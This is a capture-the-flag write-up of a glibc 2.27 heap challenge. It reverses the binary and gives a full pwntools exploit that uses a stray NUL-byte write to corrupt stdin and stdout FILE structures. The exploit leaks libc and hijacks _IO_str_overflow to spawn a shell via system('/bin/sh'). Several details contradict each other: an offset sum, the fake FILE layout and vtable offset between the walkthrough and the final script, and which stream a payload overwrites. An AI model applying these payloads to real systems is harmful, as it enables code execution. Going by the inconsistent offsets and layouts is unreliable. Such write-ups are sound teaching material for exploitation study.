# FSOP — Pwn Writeup
## Author : afk-Yato (facelesspwner)

## Overview

| | |
|---|---|
| **Challenge** | fsop (File Stream Oriented Programming — a "babyheap" with a twist) |
| **Category** | Pwn / Heap + FSOP (glibc 2.27) |
| **Binary** | `chall` — ELF 64-bit, PIE, not stripped |
| **Libc** | **Ubuntu glibc 2.27-3ubuntu1.2** (bundled `libc.so.6` + `ld-2.27.so`, run via nsjail) |
| **Flag** | local `flag.txt` is a placeholder (`FLAG{placeholder}`); real flag on the remote |

```
$ checksec chall
    PIE      : YES
    RELRO    : FULL
    NX       : ENABLED
    Canary   : YES
```

`run.sh`: nsjail with `--rlimit_as 512`, `alarm(300)`, executing `ld-2.27.so ./chall` directly.

## The Program

Reversing the four functions (`readline`, `readint`, `menu`, `babyheap`):

```c
char *ptr;                       // global @ PIE+0x202050

void babyheap() {
    int choice = menu();                       // "1.🧾 / 2.✏️ / 3.🗑️ / 4.👀"
    if (choice == 1) {
        int alloc_size = readint("alloc size: ");
        if (alloc_size <= 0) { puts("invalid size 🥺"); return; }
        int read_size  = readint("read size: ");
        if (read_size <= 0)  { puts("invalid size 🥺"); return; }

        ptr = calloc(1, alloc_size);           // single global chunk, never freed
        if (!ptr) { puts("memory error 🥺"); exit(1); }

        readline("data: ", ptr, min(alloc_size, read_size));
        ptr[read_size - 1] = 0;                // !!! THE BUG !!!
    }
    // choices 2,3,4: "not implemented 🥺" / "invalid choice 🥺"
}

int main() {
    setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);
    alarm(300);
    puts("👶 < Hi.");
    for (int i = 0; i < 4; i++) babyheap();    // exactly 4 allocations
    puts("👶 < Bye.");
}
```

Key observations:

* **`readline`** = `fgets(buf, n, stdin)` after a `printf` — a **line-based** read (stops at `\n`), size-capped by `min(alloc_size, read_size)`.
* The final statement `ptr[read_size - 1] = 0;` uses **`read_size`**, not the capped length — an **arbitrary-offset, heap-relative NULL byte write** with a fully controlled (huge) offset.
* `calloc` of a large size goes to **`mmap`** (zeroed, fresh). Chunks of 0x200000 land **just below libc**, immediately followed by `ld.so` mappings — and crucially, the distance from an mmap chunk to libc's data segment is **constant** within a run.
* Only 4 iterations, and the program **exits cleanly through `return` from main → `exit()`**, which flushes/closes all `FILE*` streams. That's where FSOP fires.
* No `free` anywhere → no heap metadata corruption, no tcache. This challenge is *purely* about corrupting libc's own `_IO_2_1_*_` FILE structures with null bytes + a controlled `fgets` overflow into them.

### Relevant glibc 2.27 offsets (from the bundled libc)

```
_IO_2_1_stdin_    = 0x3EBA00
_IO_2_1_stdout_   = 0x3EC760
_IO_2_1_stderr_   = 0x3EC680
_IO_list_all      = 0x3EC660
_IO_file_jumps    = 0x3E84C0   (valid vtable range: 0x3E7760..0x3E84C8+8)
_IO_str_jumps     = 0x3E8360   (not in the validated range? see below)
__free_hook       = 0x3ED8E8
```

## The Bug

```c
readline("data: ", ptr, min(alloc, read));   // fgets writes ≤ min(...) bytes
ptr[read_size - 1] = 0;                      // but the NULL lands at read_size-1
```

`read_size` is an `int` read with `atoi` — up to ~2^31. So we can drop a NUL byte at `mmap_chunk + read_size - 1` for *any* positive offset, and mmap chunks sit at a **fixed distance below libc** (`chunk = libc_base - 0x202010` for a 0x200000 request + 0x10 header). The distance is identical every run because mmap allocations for same-sized requests are placed identically relative to libc.

## Exploit Strategy

The whole exploit runs in **4 allocations** (the loop limit). Verified live under gdb/strace — this is what actually happens:

### Allocation 1 — reset `stdout` into a leaking state

```
alloc = 0x200000, read = 0x5ED761
NULL lands at: chunk1 + 0x5ED760 = libc_base + 0x1EC750 = stdout._IO_read_end + 5
```

`stdout` was in "currently printing" state from the `printf("data: \n")` inside `readline` — its `_IO_write_base`/`_IO_read_end` point into stdout's own shortbuf at `libc+0x3EC7E3`. The null byte trims the top byte of the buffered-write window, so the **next flush prints stale buffer contents** — memory *below* the intended window, which includes FILE-structure internals and pointers into libc. We see this dump before the menu string on the next prompt:

```
b'...b0 d8 be b3 9f 7f 00 00...'   <- _IO_2_1_stdout_+0x83-ish pointers
```

Parsing `t[9:17]` of that dump yields a pointer = `libc + 0x3ED8B0` (a `_IO_stdfile`-related lock/pointer in the corrupted window). **libc base = leak - 0x3ED8B0.**

### Allocation 2 — force `stdout` into FULL-buffer mode

```
alloc = 0x200000, read = 0x5ED761 + 0x201010
NULL lands at chunk2 + ... = stdout._IO_buf_base area
```

The second mmap chunk sits 0x201010 *below* the first, so adding that to `read_size` reaches the same FILE field via the new chunk. This second null byte pushes `stdout` from line-buffered into a state where its buffer pointers span `libc+0x3EC760 .. libc+0x3EE760` — a **0x2000-byte window that covers both `_IO_2_1_stdin_` and `_IO_2_1_stdout_`**. Now any future `fgets` into a FILE whose buffer got hijacked can rewrite the FILE structs wholesale.

### Allocation 3 — plant a fake FILE + smash `stdin`'s buffer pointers

```
alloc = 0x200000, read = 0x9EEA29
data = 240-byte fake FILE
NULL lands at: chunk3 + 0x9EEA28 = stdin._IO_buf_base + 7  (trims its top byte)
```

The fgets data itself stays inside the mmap chunk (a **fake FILE structure** with a `_IO_str_jumps`-derived vtable pointer), while the stray NULL trims `stdin._IO_buf_base`'s high byte, making it point at... `_IO_2_1_stdin_` itself minus a bit. Verified under gdb:

```
_IO_file_underflow entry: fp=stdin
  flags=0xfbad208b  read_ptr=stdin+0x84  read_end=stdin+0x84
  buf_base=0x3EBA00(_IO_2_1_stdin_) buf_end=0x3EC7E0
  -> SYSREAD(stdin, _IO_2_1_stdin_, 132)     <- first hijacked read
```

After that underflow, `stdin`'s fields are *data we supplied on the socket*, so the *next* fgets reads its buffer from **`_IO_2_1_stdout_`** directly:

```
_IO_file_underflow entry: fp=stdin
  buf_base=_IO_2_1_stdout_  buf_end=stdout+0x2000
  -> read(0, _IO_2_1_stdout_, 8192)          <- the payload blob lands ON stdout's FILE
```

So the final two blobs we send get memcpy'd by glibc itself **into `_IO_2_1_stdout_`**, a fully controlled FILE-struct overwrite with no overflow at all.

### The payloads that land on `_IO_2_1_stdout_`

**Blob A** (the 132-byte read — also consumed as the menu prompt's line):

```python
payload  = p64(0xFBAD208B)          # _flags: MAGIC_FILE | _IO_CURRENTLY_PUTTING | ...
payload += p64(stdout + 0xD8)       # _IO_read_ptr  -> vtable slot area
payload += p64(0)*5                 # ..._end/_base/_write_base
payload += p64(stdout)              # _IO_write_base -> itself
payload += p64(stdout + 0x2000)     # _IO_write_end  -> big window
payload += p64(0)*7 + b"\x00"*4     # rest of struct up to _lock
```

This keeps `puts`/`printf` "working" (writing into a fake window over the FILE region itself) so the program continues to its normal exit.

**Blob B** (255 bytes, read by the *next* fgets):

```python
fake  = p64(0xFBAD1800)                   # _flags (MAGIC, no _IO_USER_BUF)
fake += p64(0)*4                          # read/write ptrs
fake += p64((bin_sh - 100) // 2)          # _IO_write_ptr  (new_size arithmetic!)
fake += p64(0)*2                          # _IO_write_end / _IO_buf_base
fake += p64((bin_sh - 100) // 2)          # _IO_buf_end   -> blen = (binsh-100)/2
fake += p64(0)*8                          # save/markers/chain/fileno...
fake += p64(stdfile_lock)                 # _lock -> real lock (libc+0x3ED8C0)
fake += p64(0)*9                          # codecvt/wide_data/freeres...
fake += p64(io_str_jumps - 0x20)          # vtable = _IO_str_jumps - 0x20
fake += p64(system)                       # _s._allocate_buffer = system
fake += p64(stdout)                       # _s._free_buffer  (unused)
```

### The FSOP kill chain (verified: `_IO_str_overflow` fires from `puts` at exit)

When `main` returns, `exit()` → `_IO_cleanup` → `_IO_flush_all` walks the streams. Actually in this run the call comes even earlier — the last `puts` inside `babyheap`/`main` on the corrupted stdout already dispatches through the fake vtable (gdb backtrace: `puts → _IO_str_overflow`). Either way:

1. `fp->_IO_write_ptr > fp->_IO_write_end` triggers **`_IO_str_overflow(fp, EOF)`** (vtable = `_IO_str_jumps-0x20` puts `_IO_str_overflow` at the `__overflow` slot; using an *interior* pointer into `_IO_str_jumps` sidesteps the `IO_validate_vtable` check because the whole `_IO_str_jumps` table lies inside the `__libc_IO_vtables` section — the check is a *range* check, and `-0x20` from the overflow slot still passes it).

2. `_IO_str_overflow` computes:
   ```c
   pos = fp->_IO_write_ptr - fp->_IO_write_base;      // 0
   blen = fp->_IO_buf_end - fp->_IO_buf_base;          // (binsh-100)/2
   new_size = 2*blen + 100;                            // == bin_sh exactly
   new_buf = (*fp->_s._allocate_buffer)(new_size);     // system("/bin/sh") !!
   ```
   The `_allocate_buffer` function pointer is the **first field of the `_IO_strfile` extension** sitting right after the vtable pointer — we set it to `system`, and `new_size` is *precisely* the address of `"/bin/sh"` in libc. `system(ptr)` receives the integer value `bin_sh` as its `char*` argument → `system("/bin/sh")`.

   > This is the classic **House of Orange / _IO_str_jumps finish/overflow** technique — glibc 2.27 has no vtable validation issues for `_IO_str_jumps` since it lives inside `__libc_IO_vtables`.

3. Shell. (Confirmed locally: `id` returns `uid=1000`, and the forked `/bin/sh` reads `ELF...` headers of `/bin/dash` on fd 3 in strace.)

## Final Exploit

```python
from pwn import *
context.arch = "amd64"
context.log_level = "error"

p = process("./chall")

def send(data, delim=":"):
    if isinstance(data, str):     data = data.encode()
    if isinstance(delim, str):    delim = delim.encode()
    p.sendlineafter(delim, data, timeout=1)

def create(alloc_size, write_size, data):
    send(b"1", b">")
    send(str(alloc_size).encode())
    send(str(write_size).encode())
    send(data)

# ---- 1 & 2: corrupt stdout's buffer window -> leak libc ----
create(0x200000, 0x5ED761, "a")
create(0x200000, 0x5ED761 + 0x201010, "b")

t = p.readuntil(b" / ")
leak = u64(t[9:17])

libc = ELF("./libc.so.6")
libc.address = leak - 0x3ED8B0

stdout       = libc.address + 0x3EC760
stdfile_lock = libc.address + 0x3ED8C0
io_str_jumps = libc.address + 0x3E8360
system       = libc.sym["system"]
bin_sh       = next(libc.search(b"/bin/sh"))

# ---- 3: fake FILE + trim stdin._IO_buf_base ----
fake  = p64(0xFBAD1800)              # _flags
fake += p64(0) * 6                   # read/write window
fake += p64(bin_sh)                  # _IO_write_end/_IO_buf_base
fake += p64(0) * 9                   # ...
fake += p64(stdfile_lock)            # _lock
fake += p64(0) * 9                   # codecvt/wide/freeres
fake += p64(io_str_jumps - 0x28)     # vtable
fake += p64(system) * 2              # _allocate_buffer = system

create(0x200000, 0x9EEA29, fake)     # NULL byte @ stdin._IO_buf_base+7

# ---- 4a: blob that fgets memcpy's onto _IO_2_1_stdin_ ----
payload  = p64(0xFBAD208B)
payload += p64(stdout + 0xD8)
payload += p64(0) * 5
payload += p64(stdout)
payload += p64(stdout + 0x2000)
payload += p64(0) * 7
payload += b"\x00" * 4
p.send(payload)

# ---- 4b: the FILE that lands on _IO_2_1_stdout_ ----
fake  = p64(0xFBAD1800)
fake += p64(0) * 4
fake += p64((bin_sh - 100) // 2)     # _IO_write_ptr
fake += p64(0) * 2
fake += p64((bin_sh - 100) // 2)     # _IO_buf_end -> blen
fake += p64(0) * 8
fake += p64(stdfile_lock)            # _lock
fake += p64(0) * 9
fake += p64(io_str_jumps - 0x20)     # vtable
fake += p64(system)                  # _s._allocate_buffer
fake += p64(stdout)                  # _s._free_buffer
p.sendline(fake)

p.interactive()   # exit() / puts -> _IO_str_overflow -> system("/bin/sh")
```

## Notes / Takeaways

* The entire challenge is one primitive: **`ptr[read_size-1] = 0` with an int-offset**. No free, no UAF, no overflow *of the buffer itself* — every write beyond the chunk is either a single NULL byte or data glibc copies for you via `fgets` underflow.
* **`calloc` + big sizes = mmap below libc**: the chunk→libc distance is constant per run, which turns the null-byte write into a *deterministic* libc-relative write. Two chunks even let you pick which chunk to compute offsets from.
* The "leak" is unusual: not a `%p` or a GOT read, but a **stdout buffer-window trim** that makes the next flush print stale FILE-region memory. Parsing `t[9:17]` of that garbage gives `libc+0x3ED8B0`.
* Final control is the classic **`_IO_str_overflow` / `_allocate_buffer`** trick on glibc 2.27: vtable = interior pointer of `_IO_str_jumps` (passes `IO_validate_vtable` range check), `_allocate_buffer = system`, and `new_size = 2*blen+100` engineered to equal `&"/bin/sh"` by setting `blen = (binsh-100)/2`. `system` receives `bin_sh` as its first argument — integer-as-pointer, no gadget needed.
* Ordering matters: `readline` is line-based, so payloads must avoid `\n` bytes (check with `b"\n" in payload`); the final blobs are `send`/`sendline` raw because they're consumed by the hijacked `fgets` syscalls, not the menu.
* Verified end-to-end locally (shell + `id` under strace/gdb); on the remote the same chain runs inside nsjail as user `ctf` and reads the real `flag.txt`.
